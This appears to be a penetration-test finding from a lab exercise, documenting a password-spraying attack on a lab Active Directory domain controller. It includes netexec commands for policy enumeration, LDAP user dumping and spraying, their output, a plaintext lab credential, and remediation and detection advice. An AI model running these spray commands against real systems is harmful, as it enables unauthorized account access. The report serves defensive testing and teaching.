# Password Spraying: Predictable and Weak Passwords for Access

| Field | Details |
|-------|---------|
| **Severity** | 🟠 High |
| **Technique** | Password Spraying |
| **Target** | `192.168.120.100` — `DC01-WINDOWSSERVER2019` |
| **Domain** | `lab.local` |
| **Prerequisite** | Known Breach Credentials (`lab.local\gsnake`) |

## Description

Using a password spraying attack to attempt a single password across multiple user accounts. Enumerated users from LDAP with "Known Breach" supplied credentials for initial access. Sprayed specific targeted passwords (Password123!, Summer2024!, 123456789) across domain accounts.

## Evidence

### Evidence (A) : Password Policy Enumeration

Using credentials supplied from the Known Breach scenario, the password policy was enumerated to better understand complexity requirements for forming predictive passwords.

    netexec smb 192.168.120.100 -u 'gsnake' -p 'iloveyou01!' --pass-pol

    SMB  192.168.120.100 445  DC01-WINDOWSSER  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01-WINDOWSSER) (domain:lab.local) (signing:True) (SMBv1:None) (Null Auth:True)
    SMB  192.168.120.100 445  DC01-WINDOWSSER  [+] lab.local\gsnake:iloveyou01!
    SMB  192.168.120.100 445  DC01-WINDOWSSER  [+] Dumping password info for domain: LAB
    SMB  192.168.120.100 445  DC01-WINDOWSSER  Minimum password length: 4
    SMB  192.168.120.100 445  DC01-WINDOWSSER  Password history length: 24
    SMB  192.168.120.100 445  DC01-WINDOWSSER  Maximum password age: 41 days 23 hours 53 minutes
    SMB  192.168.120.100 445  DC01-WINDOWSSER  Password Complexity Flags: 000000
    SMB  192.168.120.100 445  DC01-WINDOWSSER      Domain Refuse Password Change: 0
    SMB  192.168.120.100 445  DC01-WINDOWSSER      Domain Password Store Cleartext: 0
    SMB  192.168.120.100 445  DC01-WINDOWSSER      Domain Password Lockout Admins: 0
    SMB  192.168.120.100 445  DC01-WINDOWSSER      Domain Password No Clear Change: 0
    SMB  192.168.120.100 445  DC01-WINDOWSSER      Domain Password No Anon Change: 0
    SMB  192.168.120.100 445  DC01-WINDOWSSER      Domain Password Complex: 0
    SMB  192.168.120.100 445  DC01-WINDOWSSER  Minimum password age: 1 day 4 minutes
    SMB  192.168.120.100 445  DC01-WINDOWSSER  Reset Account Lockout Counter: 1 minute
    SMB  192.168.120.100 445  DC01-WINDOWSSER  Locked Account Duration: 1 minute
    SMB  192.168.120.100 445  DC01-WINDOWSSER  Account Lockout Threshold: None
    SMB  192.168.120.100 445  DC01-WINDOWSSER  Forced Log off Time: Not Set

### Evidence (B) : Password Spray Result

Enumerated domain user list via LDAP and sprayed weak password across all accounts. Credentials confirmed for the Administrator account.

    netexec smb 192.168.120.100 -u users2.txt -p 'Password123!' --continue-on-success

    SMB  192.168.120.100 445  DC01-WINDOWSSER  [+] lab.local\Administrator:Password123! (Pwn3d!)

### Commands Used

    netexec smb 192.168.120.100 -u 'gsnake' -p 'iloveyou01!' --pass-pol
    netexec ldap 192.168.120.100 -u 'gsnake' -p 'iloveyou01!' --users > users.txt
    cat users.txt | awk '{print $5}' > users2.txt
    netexec smb 192.168.120.100 -u users2.txt -p 'Password123!' --continue-on-success

## Impact

Password spraying weak password `Password123!` confirmed credentials for account: Administrator. There are also no lockout policies on this machine, so password spraying can be continually attempted. There are no complexity rules allowing users to create weak passwords. Accounts that would get locked out are only locked out for a single minute, allowing attacks to be frequently attempted. Administrative accounts have no lockout procedure, which is a highly dangerous finding. Password spraying is a high business risk due to the risk of compromise in accounts with weak, known, or predictable passwords.

## Remediation

> Remediations are not listed in any specific order of severity unless otherwise listed.

1. **[IMPORTANT]** Ensure there is a lockout procedure for all accounts.
2. **[IMPORTANT]** Ensure there is a lockout procedure for Admin accounts.
3. Follow NIST guidelines for password phrases which emphasizes password length over password complexity. (Source: https://pages.nist.gov/800-63-4/sp800-63b.html)
4. Monitor for suspicious login activities (EventID 4625 & 4648 in rapid succession across multiple accounts).  Key indicators are low failure count per account with high diversity in accounts over a short period of time.
5. Employ Microsoft Defender for Identity (MDI) which has Password Spraying algorithms already in place.
6. Monitor for unusual sources of authentication, such as multiple attempts from a single IP.
